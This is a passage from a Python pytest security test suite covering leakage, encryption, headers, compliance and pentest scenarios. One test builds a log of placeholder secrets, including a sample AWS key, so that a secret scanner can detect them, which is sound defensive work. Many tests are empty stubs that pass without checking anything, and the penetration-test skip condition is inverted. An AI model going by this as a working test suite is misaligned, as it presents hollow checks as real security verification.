            # All state-changing operations (POST, PUT, DELETE, PATCH)
            # should require CSRF token
            
            pass
    
    # Test Group 7: Data Leakage Testing
    class TestDataLeakage:
        """Tests for data leakage vulnerabilities."""
        
        @pytest.mark.asyncio
        async def test_error_message_leakage(self):
            """Test for sensitive data in error messages."""
            
            # Test cases that might trigger errors
            test_cases = [
                ("/api/users/999999", "Non-existent user should not leak info"),
                ("/api/admin/secret", "Unauthorized access should not leak paths"),
                ("/api/data?sql=invalid", "SQL errors should not leak queries"),
            ]
            
            # This would require actual API calls
            # For now, verify error handling doesn't include sensitive info
            
            pass
        
        @pytest.mark.asyncio
        async def test_api_response_leakage(self):
            """Test for sensitive data in API responses."""
            
            # API responses should not include:
            # - Internal IDs
            # - Database structure
            # - Server information
            # - Stack traces
            # - Configuration details
            
            pass
        
        @pytest.mark.asyncio
        async def test_log_leakage(self, secret_scanner):
            """Test for secrets in logs."""
            
            # Create test log with potential secrets
            test_log_content = """
            [INFO] User login: test@example.com
            [DEBUG] API Key: sk_live_1234567890abcdef
            [ERROR] Database password: SuperSecret123!
            [INFO] JWT Secret: my_jwt_secret_key
            [DEBUG] AWS Access Key: AKIAIOSFODNN7EXAMPLE
            """
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.log', delete=False) as f:
                f.write(test_log_content)
                log_path = f.name
            
            try:
                # Scan log for secrets
                secrets_found = secret_scanner.scan_file(log_path)
                
                # Should find secrets in log
                assert len(secrets_found) >= 3, "Should detect secrets in logs"
                
                # Check specific secret types
                secret_types = [s["type"] for s in secrets_found]
                assert "api_key" in secret_types, "Should detect API keys"
                assert "password" in secret_types, "Should detect passwords"
                assert "jwt_secret" in secret_types, "Should detect JWT secrets"
                
            finally:
                os.unlink(log_path)
        
        @pytest.mark.asyncio
        async def test_metadata_leakage(self):
            """Test for metadata leakage."""
            
            # Check headers don't leak server info
            # Server: header should not include version
            # X-Powered-By: should not be present
            
            # Check robots.txt doesn't expose sensitive paths
            
            # Check directory listing is disabled
            
            pass
    
    # Test Group 8: Cryptography Validation
    class TestCryptography:
        """Tests for cryptographic implementations."""
        
        @pytest.mark.asyncio
        async def test_encryption_implementation(self, aes_encryptor, rsa_encryptor):
            """Test encryption implementation security."""
            
            # Test AES-GCM
            test_data = b"Sensitive information that needs protection"
            
            # Encrypt
            ciphertext, iv, tag = aes_encryptor.encrypt(test_data)
            
            # Verify not using same IV
            assert iv != b'\x00' * 12, "Should not use zero IV"
            
            # Decrypt
            decrypted = aes_encryptor.decrypt(ciphertext, iv, tag)
            assert decrypted == test_data, "Encryption/decryption should work"
            
            # Test with different data (should produce different ciphertext)
            test_data2 = b"Different sensitive information"
            ciphertext2, iv2, tag2 = aes_encryptor.encrypt(test_data2)
            
            assert ciphertext != ciphertext2, "Same plaintext should produce different ciphertext"
            assert iv != iv2, "Should use different IV for each encryption"
            
            # Test RSA
            rsa_test_data = b"Data for RSA encryption"
            
            # Encrypt with public key
            rsa_ciphertext = rsa_encryptor.encrypt(rsa_test_data)
            
            # Decrypt with private key
            rsa_decrypted = rsa_encryptor.decrypt(rsa_ciphertext)
            assert rsa_decrypted == rsa_test_data, "RSA encryption/decryption should work"
        
        @pytest.mark.asyncio
        async def test_hash_functions(self):
            """Test hash function security."""
            
            # Should use strong hash functions
            test_password = "MySecurePassword123!"
            
            # Test bcrypt or Argon2 for passwords
            import bcrypt
            
            # Hash password
            salt = bcrypt.gensalt(rounds=12)
            hashed = bcrypt.hashpw(test_password.encode(), salt)
            
            # Verify hash
            assert bcrypt.checkpw(test_password.encode(), hashed), \
                "Password verification should work"
            
            # Test that weak hashes are not used
            weak_hashes = ["md5", "sha1"]
            for weak_hash in weak_hashes:
                # This would check codebase for weak hash usage
                pass
        
        @pytest.mark.asyncio
        async def test_random_number_generation(self):
            """Test random number generation security."""
            
            # Test 1: Use cryptographically secure RNG
            random_bytes = secrets.token_bytes(32)
            assert len(random_bytes) == 32, "Should generate 32 random bytes"
            
            # Test 2: Randomness quality (basic check)
            # Check byte distribution
            byte_counts = {}
            for byte in random_bytes:
                byte_counts[byte] = byte_counts.get(byte, 0) + 1
            
            # No single byte should dominate
            max_count = max(byte_counts.values())
            assert max_count <= 10, "Random bytes not sufficiently distributed"
            
            # Test 3: Not using predictable seeds
            # Check that time() is not used as seed
            
            # Test 4: UUID generation should use secure RNG
            secure_uuid = uuid.uuid4()
            insecure_uuid = uuid.uuid1()  # Uses MAC address and timestamp
            
            # uuid4 should be used for security
            assert secure_uuid.version == 4, "Should use UUID v4 for security"
    
    # Test Group 9: Security Header Testing
    class TestSecurityHeaders:
        """Tests for security headers."""
        
        @pytest.mark.asyncio
        async def test_http_security_headers(self, security_headers_middleware):
            """Test HTTP security headers."""
            
            headers = security_headers_middleware.get_headers()
            
            # Required security headers
            required_headers = {
                "X-Frame-Options": ["DENY", "SAMEORIGIN"],
                "X-Content-Type-Options": ["nosniff"],
                "X-XSS-Protection": ["1; mode=block"],
                "Referrer-Policy": ["strict-origin-when-cross-origin", "no-referrer"],
                "Permissions-Policy": [],  # Should be present
            }
            
            for header, allowed_values in required_headers.items():
                assert header in headers, f"Missing security header: {header}"
                
                if allowed_values:
                    header_value = headers[header]
                    assert any(val in header_value for val in allowed_values), \
                        f"Invalid value for {header}: {header_value}"
            
            # Check CSP header (tested separately)
            if "Content-Security-Policy" in headers:
                csp = headers["Content-Security-Policy"]
                assert "'self'" in csp, "CSP should include 'self'"
                assert "unsafe-inline" not in csp, "CSP should not allow unsafe-inline"
                assert "unsafe-eval" not in csp, "CSP should not allow unsafe-eval"
        
        @pytest.mark.asyncio
        async def test_hsts_header(self, hsts_policy):
            """Test HSTS header configuration."""
            
            hsts_header = hsts_policy.get_header()
            
            # Check HSTS header format
            assert "max-age=31536000" in hsts_header, "HSTS max-age should be 1 year"
            
            if hsts_policy.include_subdomains:
                assert "includeSubDomains" in hsts_header, \
                    "HSTS should include subdomains"
            
            if hsts_policy.preload:
                assert "preload" in hsts_header, "HSTS should include preload"
        
        @pytest.mark.asyncio
        async def test_cors_configuration(self):
            """Test CORS configuration security."""
            
            # CORS should not be too permissive
            # Should not allow "*" for authenticated requests
            # Should specify allowed origins
            
            pass
    
    # Test Group 10: Compliance Validation
    class TestCompliance:
        """Tests for compliance standards."""
        
        @pytest.mark.asyncio
        async def test_gdpr_compliance(self):
            """Test GDPR compliance requirements."""
            
            # Test 1: Right to be forgotten
            # Users should be able to delete their data
            
            # Test 2: Data portability
            # Users should be able to export their data
            
            # Test 3: Privacy by design
            # Data minimization, default privacy settings
            
            # Test 4: Consent management
            # Clear consent collection and management
            
            pass
        
        @pytest.mark.asyncio
        async def test_hipaa_compliance(self):
            """Test HIPAA compliance requirements."""
            
            # Protected Health Information (PHI) handling
            # Encryption at rest and in transit
            # Access controls and audit logging
            # Business Associate Agreements (BAAs)
            
            pass
        
        @pytest.mark.asyncio
        async def test_pci_dss_compliance(self):
            """Test PCI DSS compliance requirements."""
            
            # Cardholder data protection
            # Encryption of card data
            # Access restrictions
            # Regular security testing
            
            pass
        
        @pytest.mark.asyncio
        async def test_soc2_compliance(self):
            """Test SOC 2 compliance requirements."""
            
            # Security, Availability, Processing Integrity,
            # Confidentiality, Privacy
            
            # Requires comprehensive security controls
            # Regular audits and monitoring
            
            pass
        
        @pytest.mark.asyncio
        async def test_iso27001_compliance(self):
            """Test ISO 27001 compliance requirements."""
            
            # Information Security Management System (ISMS)
            # Risk assessment and treatment
            # Security controls implementation
            # Continuous improvement
            
            pass
    
    # Additional Security Tests
    class TestAdvancedSecurity:
        """Advanced security tests."""
        
        @pytest.mark.asyncio
        async def test_fuzz_testing(self, security_fuzzer):
            """Test fuzzing for security vulnerabilities."""
            
            # Test API endpoints with fuzzed inputs
            endpoints = [
                "/api/v1/agents",
                "/api/v1/users",
                "/api/v1/config",
            ]
            
            for endpoint in endpoints:
                # Generate fuzzed inputs
                fuzzed_inputs = security_fuzzer.generate_fuzzed_inputs(
                    endpoint=endpoint,
                    count=100
                )
                
                # Test each fuzzed input
                # This would make actual HTTP requests
                # For now, verify fuzzer generates varied inputs
                assert len(fuzzed_inputs) == 100, "Should generate fuzzed inputs"
                
                # Check input variety
                input_types = set()
                for fuzzed in fuzzed_inputs:
                    if isinstance(fuzzed, dict):
                        input_types.add("dict")
                    elif isinstance(fuzzed, str):
                        input_types.add("str")
                    elif isinstance(fuzzed, list):
                        input_types.add("list")
                
                assert len(input_types) > 1, "Fuzzer should generate multiple input types"
        
        @pytest.mark.asyncio
        async def test_penetration_testing_scenarios(self, pentest_suite):
            """Test penetration testing scenarios."""
            
            # Run various pen test scenarios
            scenarios = [
                "authentication_bypass",
                "api_endpoint_discovery",
                "data_exfiltration",
                "privilege_escalation",
            ]
            
            for scenario in scenarios:
                results = pentest_suite.run_scenario(scenario)
                
                # Check results
                assert "vulnerabilities" in results, "Should return vulnerabilities"
                assert "recommendations" in results, "Should return recommendations"
                
                # Log findings
                if results["vulnerabilities"]:
                    print(f"\nPen test scenario '{scenario}' found vulnerabilities:")
                    for vuln in results["vulnerabilities"]:
                        print(f"  - {vuln}")
        
        @pytest.mark.asyncio
        async def test_network_security(self):
            """Test network security controls."""
            
            # Test 1: Port scanning protection
            # Only necessary ports should be open
            
            # Test 2: DDoS protection
            # Rate limiting and throttling
            
            # Test 3: Firewall rules
            # Appropriate network segmentation
            
            # Test 4: TLS configuration
            # Strong ciphers, proper certificate validation
            
            pass
        
        @pytest.mark.asyncio
        async def test_application_security(self, vulnerability_scanner):
            """Test application security controls."""
            
            # Run comprehensive vulnerability scan
            scan_results = vulnerability_scanner.full_scan()
            
            # Check scan results
            assert "vulnerabilities" in scan_results, "Scan should return vulnerabilities"
            assert "risk_level" in scan_results, "Scan should assess risk level"
            
            # Critical vulnerabilities should be addressed
            critical_vulns = [
                v for v in scan_results["vulnerabilities"]
                if v.get("severity") == "critical"
            ]
            
            if critical_vulns:
                print(f"\nFound {len(critical_vulns)} critical vulnerabilities:")
                for vuln in critical_vulns:
                    print(f"  - {vuln.get('title', 'Unknown')}")
            
            # High severity vulnerabilities should be minimal
            high_vulns = [
                v for v in scan_results["vulnerabilities"]
                if v.get("severity") == "high"
            ]
            
            assert len(high_vulns) <= 5, "Too many high severity vulnerabilities"
            
            # Overall risk should be low or medium
            acceptable_risk_levels = ["low", "medium"]
            assert scan_results["risk_level"] in acceptable_risk_levels, \
                f"Risk level too high: {scan_results['risk_level']}"
        
        @pytest.mark.asyncio
        async def test_data_security(self, secret_manager):
            """Test data security controls."""
            
            # Test 1: Data classification
            # Sensitive data should be identified
            
            # Test 2: Data encryption
            # Sensitive data encrypted at rest
            
            # Test 3: Data masking
            # PII masked in logs and non-production
            
            # Test 4: Data retention
            # Data kept only as long as necessary
            
            # Test secret management
            test_secrets = {
                "database_password": "DbPass123!",
                "api_key": "sk_live_abcdef123456",
                "jwt_secret": "super_secret_jwt_key",
            }
            
            for name, value in test_secrets.items():
                # Store secret
                secret_manager.encrypt_secret(name, value)
                
                # Retrieve secret
                retrieved = secret_manager.get_secret(name)
                assert retrieved == value, "Secret should be retrievable"
                
                # Secret should not be in plaintext in memory
                # (This is hard to test without memory inspection)
            
            # Test secret rotation
            old_secret = secret_manager.get_secret("database_password")
            secret_manager.rotate_secret("database_password", "NewDbPass456!")
            new_secret = secret_manager.get_secret("database_password")
            
            assert old_secret != new_secret, "Secret rotation should change value"
            assert new_secret == "NewDbPass456!", "New secret should be set"


# Security test markers
pytest.mark.security_critical = pytest.mark.skipif(
    os.getenv("SKIP_CRITICAL_SECURITY_TESTS", "false").lower() == "true",
    reason="Critical security tests can be skipped in CI"
)

pytest.mark.penetration_test = pytest.mark.skipif(
    os.getenv("RUN_PENETRATION_TESTS", "false").lower() == "true",
    reason="Penetration tests require special setup"
)

pytest.mark.compliance_test = pytest.mark.skipif(
    os.getenv("SKIP_COMPLIANCE_TESTS", "false").lower() == "true",
    reason="Compliance tests can be extensive"
)


if __name__ == "__main__":
    # Run security tests
    pytest.main([
        __file__,
        "-v",
        "--tb=short",
        "-k", "not penetration_test and not compliance_test",  # Skip heavy tests by default
        "--log-level=WARNING",
        "--color=yes"
    ])